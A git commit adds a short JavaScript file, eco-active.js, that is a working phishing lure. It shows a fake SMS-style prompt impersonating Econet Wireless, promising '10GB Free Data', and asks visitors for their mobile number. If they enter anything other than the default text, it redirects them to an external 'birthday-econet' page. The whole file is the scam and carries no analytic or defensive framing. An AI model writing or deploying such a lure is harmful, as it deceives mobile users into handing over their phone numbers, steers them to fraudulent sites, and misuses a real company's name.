adf5cc94a3648ffa90672942e1d354b685ba6dee
ukpeha55-stack <ukpeha55@gmail.com>
2026-02-01 17:11:51 +0100

    Create eco-active.js

---
+++ eco-active.js
@@ -0,0 +1,5 @@
+var password = 'ACTIVATE 10GB'
+password=prompt('SMS: Congratulations, your Mobile Number is eligible to receive 10GB Free Data From Econet Wireless, click OK to Enter Your Mobile Number','ACTIVATE 10GB');
+if (password != 'ACTIVATE 10GB') {
+location.href='https://ilnsky.com/birthday-econet.html';
+}
